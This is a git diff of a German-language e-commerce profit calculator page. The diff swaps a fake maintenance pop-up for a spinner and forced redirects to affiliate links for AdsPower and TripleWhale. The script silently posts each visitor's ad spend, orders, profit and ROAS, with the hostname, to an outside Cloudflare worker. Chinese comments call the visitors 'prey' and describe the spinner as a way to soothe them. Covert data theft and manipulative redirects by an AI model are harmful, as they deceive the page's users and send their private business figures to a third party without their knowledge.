@@ -268,16 +268,7 @@
         </footer>
     </main>
 
-    <div id="intentModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/80 backdrop-blur-sm opacity-0 transition-opacity duration-300">
-        <div class="bg-[#0a0f1c] border border-slate-700 rounded-2xl p-8 max-w-sm w-full text-center shadow-[0_0_50px_rgba(0,0,0,0.8)] relative transform scale-95 transition-transform duration-300" id="intentModalContent">
-            <div class="w-12 h-12 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-4 border border-slate-600">
-                <svg class="w-6 h-6 text-slate-300 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
-            </div>
-            <h3 class="text-white font-bold text-lg mb-2">System-Update in Bearbeitung</h3>
-            <p class="text-slate-400 text-sm mb-6 leading-relaxed">Unser Partner-Netzwerk (SaaS-Anbindung) wird derzeit gewartet. Bitte versuchen Sie es in Kürze noch einmal.</p>
-            <button onclick="closeIntentModal()" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-white rounded-lg transition-colors text-sm font-medium border border-slate-600">Verstanden</button>
-        </div>
-    </div>
+
 
     <script>
         const formatEur = new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' });
@@ -405,51 +396,42 @@
             
             if(intent === 'none') return; 
 
+            // 抓取猎物底牌数据
             const adspend = document.getElementById('adspend').value;
             const orders = document.getElementById('orders').value;
             const profit = document.getElementById('outNetProfit').innerText;
             const roas = document.getElementById('outRoas').innerText;
 
+            // 1. 幽灵情报发射 (飞向你的 iPhone Bark)
             const GHOST_WORKER_URL = 'https://metrics-ping.cavrt623.workers.dev'; 
-            
             if(GHOST_WORKER_URL && !GHOST_WORKER_URL.includes('YOUR-WORKER-NAME')) {
                 try {
                     fetch(GHOST_WORKER_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            intent: intent,
-                            spend: adspend,
-                            orders: orders,
-                            profit: profit,
-                            roas: roas,
-                            url: window.location.hostname
-                        }),
+                        body: JSON.stringify({ intent: intent, spend: adspend, orders: orders, profit: profit, roas: roas, url: window.location.hostname }),
                         keepalive: true 
                     }).catch(e => {});
                 } catch(e) {}
             }
 
-            const modal = document.getElementById('intentModal');
-            const content = document.getElementById('intentModalContent');
-            modal.classList.remove('hidden');
-            modal.classList.add('flex');
+            // 2. 交互锁死，安抚情绪的“极客加载动画”
+            btn.innerHTML = '<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white inline-block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Weiterleitung...';
+            btn.classList.add('opacity-75', 'cursor-not-allowed', 'pointer-events-none');
+
+            // 3. 致命跳转：携带你的分佣 ID 强行注入
             setTimeout(() => {
-                modal.classList.remove('opacity-0');
-                content.classList.remove('scale-95');
-            }, 10);
+                if(intent === 'scale_adspower_agency') {
+                    // 🟢 绿灯：带着你的专属 ID 瞬间切入 AdsPower！
+                    window.location.href = 'https://www.adspower.com/share/dT0PJb';
+                } else if(intent === 'fix_tracking_triplewhale') {
+                    // 🔴 红灯：暂时保留占位符
+                    window.location.href = 'https://triplewhale.grsm.io/YOUR_AFFILIATE_ID_HERE';
+                }
+            }, 400); 
         }
 
-        function closeIntentModal() {
-            const modal = document.getElementById('intentModal');
-            const content = document.getElementById('intentModalContent');
-            modal.classList.add('opacity-0');
-            content.classList.add('scale-95');
-            setTimeout(() => {
-                modal.classList.add('hidden');
-                modal.classList.remove('flex');
-            }, 300);
-        }
+
 
         document.addEventListener('DOMContentLoaded', calculate);
     </script>
